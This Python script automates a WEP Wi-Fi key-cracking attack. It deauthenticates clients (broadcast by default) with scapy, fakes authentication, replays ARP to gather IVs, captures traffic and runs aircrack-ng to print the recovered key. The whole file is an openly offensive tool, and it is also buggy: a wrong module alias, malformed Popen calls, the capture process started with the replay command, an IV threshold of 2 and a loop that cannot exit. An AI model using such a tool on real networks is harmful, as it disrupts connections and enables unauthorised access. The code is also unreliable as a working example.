from scapy.all import *
from argparse import ArgumentParser as AP
import subprocess
import multiprocessing as pm
import shlex
import time
import csv

# Async function to spawn child and get ARP packets... Will be terminated by T3
def getARP():
    aireplay = subprocess.Popen([cmd_arpreplay], stdout=subprocess.PIPE)
    dd = subprocess.Popen(['dd', 'of=aireplay_output.txt'], stdin=aireplay.stdout, stderr=subprocess.PIPE)
    aireplay.stdout.close()

    got_arp = False

    while not got_arp:
        time.sleep(3)
        f = open('aireplay_output.txt', 'r')
        for line in f:
            if 'ARP requests and' in line:
                if 'got 0 ARP requests' in line:
                    continue
                else:
                    got_arp = True
                    break
        if not got_arp:
            # Send de-auth packets
            # Information taken from args
            dot11 = Dot11(addr1=de_auth_target, addr2=access_point, addr3=access_point)
            deauth_packet = RadioTap()/dot11/Dot11Deauth()
            sendp(deauth_packet, iface=iface, count=de_auth_packet_count, inter=0.100)

        else:print('Got ARP, injecting packets now...')

# Function to run subprocess.Popen([cmd_airodump])as async; terminated by T3
def runairodump(cmd_str):
    airodump = subprocess.Popen([cmd_str])

# Check if we have enough IVs to terminate first two child processes
def get_enough_iv(e):
    num_ivs = 0

    # while not enough_ivs:
    while not e.is_set():
        csv_file = open('output-01.csv')
        csv_reader = csv.reader(csv_file, delimiter=',')
        line_count = 0

        for row in csv_reader:
            if line_count == 2:
                num_ivs = int(row[10])
                line_count += 1

            else: line_count += 1

        if num_ivs >= 2:e.set()

    print(f'{num_ivs} many IVs have been captured. Terminating threads...')

# Main program elements
if __name__ == "__main__":
    parser = AP(description="Capture ARP packets, exctract the RC4 keystreams, and crack the WEP key.")
    parser.add_argument("-i", "--interface", help="interface to sniff and send packets from", required=True)
    parser.add_argument("-a", "--access_point", help="MAC address of the access point, also known as the BSSID of the network.", required=True)
    parser.add_argument("-s", "--source", help="MAC address of the device injecting the packets. run ifconfig to find it", required=True)
    parser.add_argument("-c", "--channel", help="Channel that target network is operation on.", required=True)
    parser.add_argument("-p", "--packets", help="packets per second to inject", default=500)
    parser.add_argument("-t", "--target", help="MAC address of the target device for the de-auth attack, default is broadcast", default='ff:ff:ff:ff:ff:ff')
    parser.add_argument("-n", "--number_deauth", help="Number of de-auth packets to send per batch", default=25)
    parser.add_argument("-r", "--captured_arp_packets", help="Number of IVs to capture before attempting to crack password.")
    args = parser.parse_args()

    iface = args.interface
    access_point = args.access_point
    source_mac = args.source
    network_channel = args.channel
    packets_per_second = args.packets
    de_auth_target = args.target
    de_auth_packet_count = args.number_deauth
    packet_capture_count = args.captured_arp_packets

    cmd_fake_auth = shlex.split(f'aireplay-ng --fakeauth 0 -a {access_point} -h {source_mac} {iface}')
    cmd_arpreplay = shlex.split(f'aireplay-ng --arpreplay -b {access_point} -h {source_mac} {iface}')
    cmd_airodump = shlex.split(f'airodump-ng {iface} --bssid {access_point} --channel {network_channel} --write output')
    cmd_aircrack = shlex.split('aircrack-ng output-01.cap')


    # Run this command as is
    fake_auth = subprocess.Popen([cmd_fake_auth], stdout = subprocess.PIPE)

    # Thread #1: Start the async thread to get ARP packets, add process_getARP.join() if we want it to be blocking. Terminated when we have enough IVs
    process_getARP = mp.Process(target=getARP, args=None)
    process_getARP.start()

    # Thread #2: This thread is to be terminated when we have enough IVs
    process_runairodump = mp.Process(target=runairodump, args=(cmd_arpreplay,))
    process_runairodump.start()

    # Thead #3: Will self terminate once loop conpleted. Upon completion, will terminate threads 1 and 2
    num_ivs = 0
    enough_ivs = mp.Event()

    # setup and tart process
    process_get_enough_ivs = mp.Process(target=get_enough_iv, args=(enough_ivs,))
    process_get_enough_ivs.start()
    process_get_enough_ivs.join()

    # While flag is not set, wait then check status
    while not enough_ivs.is_set():

        # If flag is set, kill processes, otherwise wait
        if enough_ivs.is_set():
            process_getARP.join()
            process_getARP.close()
            process_runairodump.join()
            process_runairodump.close()
            process_get_enough_ivs.close()
            
        # What if the flag gets set during the time.sleep() ???
        # else: time.sleep(3)
        else: print('Not enough IVs so far...')

    # Run this code as is
    aircrack = subprocess.Popen([cmd_aircrack], stdout=subprocess.PIPE)
    dd = subprocess.Popen(['dd', 'of=aircrack_output.txt'], stdin=aircrack.stdout, stderr=subprocess.PIPE)
    aircrack.stdout.close()

    completed = False
    key_line = ''

    while not completed:
        time.sleep(3)
        f = open('aircrack_output.txt', 'r')
        for line in f:
            if 'Failed.' in line:
                print('Did not find the key. Try again with more IVs. Closing program...')
                exit(0)
            elif 'KEY FOUND' in line:
                print('Key was found!')
                completed = True
                key_line = line

    key = key_line.rstrip().split(' ')[3]
    print(key)
    # Program is finished
